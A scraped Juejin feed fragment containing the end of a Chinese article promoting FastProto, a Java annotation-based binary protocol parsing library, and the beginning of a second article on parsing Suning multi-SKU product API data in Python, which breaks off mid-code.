<li>出一个线上问题，要对照抓包逐位排查，<strong>排错效率很低</strong>；</li>
<li>新同事接手，只能从 <code>array[offset + 13]</code> 这种写法里硬抠含义。</li>
</ul>
<p>以一条 20 字节的气象报文为例，对应的协议结构大致如下：</p>





















































































<table><thead><tr><th align="center">字节偏移</th><th align="center">位偏移</th><th align="center">数据类型(C/C++)</th><th align="center">信号名称</th><th align="center">单位</th><th align="center">换算公式</th></tr></thead><tbody><tr><td align="center">0</td><td align="center"/><td align="center">unsigned char</td><td align="center">设备编号</td><td align="center"/><td align="center"/></tr><tr><td align="center">1</td><td align="center"/><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr><tr><td align="center">2-9</td><td align="center"/><td align="center">long</td><td align="center">时间戳</td><td align="center">ms</td><td align="center"/></tr><tr><td align="center">10-11</td><td align="center"/><td align="center">unsigned short</td><td align="center">湿度</td><td align="center">%RH</td><td align="center"/></tr><tr><td align="center">12-13</td><td align="center"/><td align="center">short</td><td align="center">温度</td><td align="center">℃</td><td align="center"/></tr><tr><td align="center">14-17</td><td align="center"/><td align="center">unsigned int</td><td align="center">气压</td><td align="center">Pa</td><td align="center">p * 0.1</td></tr><tr><td align="center">18</td><td align="center">0</td><td align="center">bool</td><td align="center">设备有效标识</td><td align="center"/><td align="center"/></tr><tr><td align="center">18</td><td align="center">3-7</td><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr><tr><td align="center">19</td><td align="center"/><td align="center"/><td align="center">预留</td><td align="center"/><td align="center"/></tr></tbody></table>
<p>现实中的协议往往比这张表复杂得多：字段更多、版本更多、变更更频繁。<br/>
<strong>FastProto 的目标，就是让你用 Java 类 + 注解，直接“把这张表写成代码”。</strong></p>
<p>基于这份协议，传统手写解析代码大概是这样：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">byte</span>[] datagram = ...;

<span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> datagram[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xFF</span>;

<span class="hljs-type">long</span> <span class="hljs-variable">timeMillis</span> <span class="hljs-operator">=</span>
        ((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xFF</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">3</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">16</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">24</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">32</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">7</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">40</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">48</span>) |
        (((<span class="hljs-type">long</span>) datagram[<span class="hljs-number">9</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">56</span>);
<span class="hljs-type">Timestamp</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Timestamp</span>(timeMillis);

<span class="hljs-type">int</span> <span class="hljs-variable">humidity</span> <span class="hljs-operator">=</span> (datagram[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xFF</span>) | ((datagram[<span class="hljs-number">11</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>);
<span class="hljs-type">int</span> <span class="hljs-variable">temperature</span> <span class="hljs-operator">=</span> (<span class="hljs-type">short</span>) ((datagram[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">0xFF</span>) | ((datagram[<span class="hljs-number">13</span>] &amp; <span class="hljs-number">0xFF</span>) &lt;&lt; <span class="hljs-number">8</span>));

<span class="hljs-type">boolean</span> <span class="hljs-variable">deviceValid</span> <span class="hljs-operator">=</span> (datagram[<span class="hljs-number">18</span>] &amp; <span class="hljs-number">0x01</span>) != <span class="hljs-number">0</span>;
</code></pre>
<p>字段一多、协议一改，<strong>偏移量、字节序、位运算</strong> 全靠人脑记，既枯燥又容易犯错。</p>
<hr/>
<h3 data-id="heading-1">用 FastProto 写同一份协议，会是什么样？</h3>
<p><strong>FastProto 的核心思想：用注解把“协议结构”直接写在 Java 类上——用一个 POJO 把协议“写成代码”，做到真正的“代码即协议、协议即代码”。</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.indunet.fastproto.annotation.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Weather</span> {
    <span class="hljs-meta">@UInt8Type(offset = 0)</span>
    <span class="hljs-type">int</span> id;

    <span class="hljs-meta">@TimeType(offset = 2)</span>
    Timestamp time;

    <span class="hljs-meta">@UInt16Type(offset = 10)</span>
    <span class="hljs-type">int</span> humidity;

    <span class="hljs-meta">@Int16Type(offset = 12)</span>
    <span class="hljs-type">int</span> temperature;

    <span class="hljs-meta">@UInt32Type(offset = 14)</span>
    <span class="hljs-type">long</span> pressure;

    <span class="hljs-meta">@BoolType(byteOffset = 18, bitOffset = 0)</span>
    <span class="hljs-type">boolean</span> deviceValid;
}
</code></pre>
<p>解码和编码只需要两行：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">byte</span>[] datagram = ...;                       <span class="hljs-comment">// 设备发送的二进制报文</span>
<span class="hljs-type">Weather</span> <span class="hljs-variable">weather</span> <span class="hljs-operator">=</span> FastProto.decode(datagram, Weather.class);

<span class="hljs-type">byte</span>[] bytes = FastProto.encode(weather, <span class="hljs-number">20</span>); <span class="hljs-comment">// 重新封装成 20 字节报文</span>
</code></pre>
<p>如果需要做简单换算（比如气压 *0.1），也可以直接写在注解上：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Weather</span> {
    ...

    <span class="hljs-meta">@UInt32Type(offset = 14)</span>
    <span class="hljs-meta">@DecodingFormula(lambda = "x -&gt; x * 0.1")</span>           <span class="hljs-comment">// 解码: uint32 -&gt; double</span>
    <span class="hljs-meta">@EncodingFormula(lambda = "x -&gt; (long) (x * 10)")</span>   <span class="hljs-comment">// 编码: double -&gt; uint32</span>
    <span class="hljs-type">double</span> pressure;
}
</code></pre>
<p>这样，<strong>协议就变成了一个清晰的 Java 类</strong>：<br/>
谁在第几字节、用什么类型、怎么换算，都写在这个 POJO 上，<strong>这份类本身就是最权威的协议文档</strong>，一眼就能看懂，新同事也能快速接手。</p>
<hr/>
<h3 data-id="heading-2">FastProto 帮你省下什么？</h3>
<ul>
<li>
<p><strong>少写重复代码</strong>：<br/>
不再满屏位运算、偏移常量，把注意力放回到“字段定义”和“业务含义”上。</p>
</li>
<li>
<p><strong>协议变更更轻松</strong>：<br/>
字段新增/调整时，只需改类和注解，而不是在一堆 <code>offset += 4;</code> 里埋头搜索。</p>
</li>
<li>
<p><strong>更容易排查问题</strong>：<br/>
二进制抓包一对，看看注解和字段就能快速定位问题，而不是一行一行 print。</p>
</li>
</ul>
<p>FastProto 同时提供<strong>非注解 API</strong>（链式 <code>decode()</code> / <code>create()</code>）、<strong>校验和 / CRC 注解</strong>、<strong>Netty / Kafka 集成</strong>等能力，方便你在不同项目里按需使用。</p>
<hr/>
<h3 data-id="heading-3">想试试？可以从这里开始</h3>
<ul>
<li><strong>引入依赖（Maven）</strong>：</li>
</ul>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.indunet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastproto<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.12.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ul>
<li><strong>更完整的使用说明</strong>：可以查看在线文档站点<br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Findunet.github.io%2Ffastproto%2Fhelp.html" target="_blank" title="https://indunet.github.io/fastproto/help.html" ref="nofollow noopener noreferrer"><code>https://indunet.github.io/fastproto/help.html</code></a> ，<br/>
也可以直接阅读项目里的 <code>README-zh.md</code> 和 <code>docs</code> 目录。</li>
</ul>
<hr/>
<h3 data-id="heading-4">欢迎交流 &amp; 点个 star 支持一下</h3>
<p>FastProto 是一个持续维护的开源项目，很多功能都来自真实业务场景。<br/>
<strong>非常欢迎你：</strong></p>
<ul>
<li>在实际项目中尝试使用，提 Issue 分享使用体验与改进建议；</li>
<li>根据自己的协议场景，提 PR 一起补充文档和示例；</li>
<li>把它推荐给也在为二进制解析头疼的 Java 同学。</li>
</ul>
<p>如果这个项目对你有一点点帮助，<br/>
<strong>也欢迎在 GitHub 上给一个 star，表示支持。</strong><br/>
你的鼓励，会让这个轮子越磨越好。</p>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Findunet%2Ffastproto" target="_blank" title="https://github.com/indunet/fastproto" ref="nofollow noopener noreferrer">GitHub - indunet/fastproto</a>
项目提供完善的中文 / 英文 README 以及文档站点支持，从快速上手到进阶用法都有覆盖。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧]]></title>    <link>https://juejin.cn/post/7579904059525726234</link>    <guid>https://juejin.cn/post/7579904059525726234</guid>    <pubDate>2025-12-05T03:12:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579904059525726234" data-draft-id="7579904059525660698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-12-05T03:12:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户18007905473"/> <meta itemprop="url" content="https://juejin.cn/user/3994938590628912"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3994938590628912/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户18007905473
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:12:22.000Z" title="Fri Dec 05 2025 03:12:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">苏宁多规格商品 API 解析实战：SKU 关联逻辑与属性值提取技巧</h2>
<p>苏宁多规格商品（如手机、家电、服饰等）的 API 返回数据中，SKU 与商品主信息的关联逻辑复杂，属性值格式不统一（如分隔符、命名规则差异），是数据解析的核心难点。本文基于苏宁开放平台<code>suning.custom.product.get</code> API 实战，拆解 SKU 与商品主数据的关联逻辑，提供通用的属性值提取、规格维度拆分技巧，并适配不同品类的格式差异，实现多规格商品数据的标准化解析。</p>
<h3 data-id="heading-1">一、核心背景：苏宁多规格商品 API 数据结构</h3>
<p><a href="https://link.juejin.cn?target=o0b.cn%2Fanzexi" target="_blank" title="o0b.cn/anzexi" ref="nofollow noopener noreferrer">苏宁多规格商品的 API </a>响应中，「商品主信息」与「SKU 子信息」是「1:N」的关联关系，核心结构如下：</p>
<p>json</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0000"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"msg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"body"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"productInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// 商品主信息（唯一）</span>
      <span class="hljs-attr">"productCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"100032189765"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 商品主ID</span>
      <span class="hljs-attr">"productName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"小米14 5G手机【多规格】"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"skuInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// SKU子信息（多个）</span>
      <span class="hljs-attr">"skuList"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"skuCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976512"</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// SKU唯一ID</span>
          <span class="hljs-attr">"skuAttr"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色+12GB+256GB"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// SKU属性组合</span>
          <span class="hljs-attr">"salePrice"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3999.0</span><span class="hljs-punctuation">,</span>          <span class="hljs-comment">// SKU单独售价</span>
          <span class="hljs-attr">"stockCount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">200</span>             <span class="hljs-comment">// SKU单独库存</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"skuCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"10003218976513"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"skuAttr"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"白色+12GB+512GB"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"salePrice"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4299.0</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"stockCount"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">150</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"attributeInfo"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>  <span class="hljs-comment">// 商品静态属性（补充规格维度说明）</span>
      <span class="hljs-attr">"attributeList"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"机身颜色"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"黑色;白色;蓝色"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"attrName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"存储容量"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"attrValue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"256GB;512GB;1TB"</span><span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-2">核心关联逻辑</h4>
<ol>
<li><strong>主键关联</strong>：<code>productCode</code>（商品主 ID）是所有 SKU 的父级标识，SKU 编码通常以商品主 ID 为前缀（如<code>100032189765</code> + <code>12</code> = <code>10003218976512</code>）；</li>
<li><strong>属性关联</strong>：<code>skuAttr</code>（SKU 属性组合）对应<code>attributeInfo</code>中的静态属性维度（如颜色、存储、尺寸等）；</li>
<li><strong>价格 / 库存关联</strong>：SKU 级的价格 / 库存优先级高于商品主信息的价格 / 库存（部分 SKU 有单独定价）。</li>
</ol>
<h3 data-id="heading-3">二、SKU 关联逻辑拆解与验证</h3>
<h4 data-id="heading-4">1. 主键关联规则（通用）</h4>
<p>苏宁 SKU 编码生成遵循「商品主 ID + 规格序号」的规则，不同品类的序号长度不同（1-3 位），验证逻辑如下：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_sku_product_relation</span>(<span class="hljs-params">product_code: <span class="hljs-built_in">str</span>, sku_code: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""
    验证SKU与商品主ID的关联关系
    :param product_code: 商品主ID
    :param sku_code: SKU编码
    :return: 是否关联
    """</span>
    <span class="hljs-comment"># 规则1：SKU编码以商品主ID为前缀</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sku_code.startswith(product_code):
        <span class="hljs-comment"># 兼容部分品类SKU编码前缀省略末尾0的情况（如商品主ID=100032189760，SKU=1000321897612）</span>
        <span class="hljs-keyword">if</span> sku_code.startswith(product_code.rstrip(<span class="hljs-string">"0"</span>)):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-comment"># 规则2：前缀后至少1位规格序号</span>
    seq_part = sku_code[<span class="hljs-built_in">len</span>(product_code):]
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(seq_part) &gt;= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> seq_part.isdigit()

<span class="hljs-comment"># 测试验证</span>
product_code = <span class="hljs-string">"100032189765"</span>
sku_code_valid = <span class="hljs-string">"10003218976512"</span>
sku_code_invalid = <span class="hljs-string">"10003218988812"</span>
<span class="hljs-built_in">print</span>(verify_sku_product_relation(product_code, sku_code_valid))  <span class="hljs-comment"># True</span>
<span class="hljs-built_in">print</span>(verify_sku_product_relation(product_code, sku_code_invalid))  <span class="hljs-comment"># False</span>
</code></pre>
<h4 data-id="heading-5">2. 价格 / 库存关联优先级</h4>
<p>SKU 级价格 / 库存是实际可售数据，解析时需优先使用 SKU 维度数据，规则如下：</p>






























<table><thead><tr><th>数据维度</th><th>优先级</th><th>适用场景</th></tr></thead><tbody><tr><td>SKU 售价</td><td>最高</td><td>下单定价、价格监控</td></tr><tr><td>商品主售价</td><td>次高</td><td>无 SKU 单独定价时兜底</td></tr><tr><td>SKU 库存</td><td>最高</td><td>库存预警、可售判断</td></tr><tr><td>商品主库存</td><td>次高</td><td>无 SKU 单独库存时兜底</td></tr></tbody></table>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sku_effective_price</span>(<span class="hljs-params">sku_data: <span class="hljs-built_in">dict</span>, product_price: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-string">"""
    获取SKU有效售价（优先SKU售价，无则用商品主售价）
    :param sku_data: SKU单条数据
    :param product_price: 商品主售价
    :return: 有效售价
    """</span>
    sku_price = <span class="hljs-built_in">float</span>(sku_data.get(<span class="hljs-string">"salePrice"</span>, <span class="hljs-number">0.0</span>))
    <span class="hljs-keyword">return</span> sku_price <span class="hljs-keyword">if</span> sku_price &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> product_price

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sku_effective_stock</span>(<span class="hljs-params">sku_data: <span class="hljs-built_in">dict</span>, product_stock: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""
    获取SKU有效库存（优先SKU库存，无则用商品主库存）
    :param sku_data: SKU单条数据
    :param product_stock: 商品主库存
    :return: 有效库存
    """</span>
    sku_stock = sku_data.get(<span class="hljs-string">"stockCount"</span>, <span class="hljs-number">0</span>)
    <span class="hljs-comment"># 处理苏宁库存格式（如"200+"→200，"无货"→0）</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(sku_stock, <span class="hljs-built_in">str</span>):
        <span class="hljs-keyword">if</span> <span class="hljs-string">"+"</span> <span class="hljs-keyword">in</span> sku_stock:
            sku_stock = <span class="hljs-built_in">int</span>(sku_stock.replace(<span class="hljs-string">"+"</span>, <span class="hljs-string">""</span>))
        <span class="hljs-keyword">elif</span> sku_stock <span class="hljs-keyword">in</span> [<span class="hljs-string">"无货"</span>, <span class="hljs-string">"缺货"</span>]:
            sku_stock = <span class="hljs-number">0</span>
        <span class="hljs-keyword">else</span>:
            sku_stock = <span class="hljs-built_in">int</span>(sku_stock) <span class="hljs-keyword">if</span> sku_stock.isdigit() <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> sku_stock <span class="hljs-keyword">if</span> sku_stock &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> product_stock
</code></pre>
<h3 data-id="heading-6">三、属性值提取核心技巧（适配多格式）</h3>
<p>苏宁不同品类的<code>skuAttr</code>格式差异极大，是解析的核心痛点，以下是通用提取技巧：</p>
<h4 data-id="heading-7">1. 多分隔符适配（解决格式不统一）</h4>
<p><code>skuAttr</code>常见分隔符包括<code>+</code>、<code>/</code>、<code>|</code>、<code>；</code>、空格等，需适配所有分隔符拆分属性：</p>
<p>python</p>
<p>运行</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> re

<span class="hljs-keyword">def</span> <span class="hljs-title function_">split_sku_attr</span>(<span class="hljs-params">sku_attr: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">list</span>:
    <span class="hljs-string">"""
    拆分SKU属性字符串（适配多分隔符）
    :param sku_attr: SKU属性字符串（如"黑色+12GB+256GB"、"白色/512GB"）
    :return: 拆分后的属性值列表
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sku_attr:
        <span class="hljs-keyword">return</span> []
    <span class="hljs-comment"># 正则匹配所有常见分隔符，统一替换为+后拆分</span>
    attr_str = re.sub(<span class="hljs-string">r"[/|；\s]"</span>, <span class="hljs-string">"+"</span>, sku_attr)
    <span class="hljs-comment"># 去重空值、去重重复属性</span>
    attr_list = [attr.strip() <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> attr_str.split(<span class="hljs-string">"+"</span>) <span class="hljs-keyword">if</span> attr.strip()]
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(attr_list))

<span class="hljs-comment"># 测试多格式拆分</span>
test_attrs = [
    <span class="hljs-string">"黑色+12GB+256GB"</span>,
    <span class="hljs-string">"白色/512GB"</span>,
    <span class="hljs-string">"蓝色 | 8GB | 128GB"</span>,
    <span class="hljs-string">"红色；256GB"</span>
]
<span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> test_attrs:
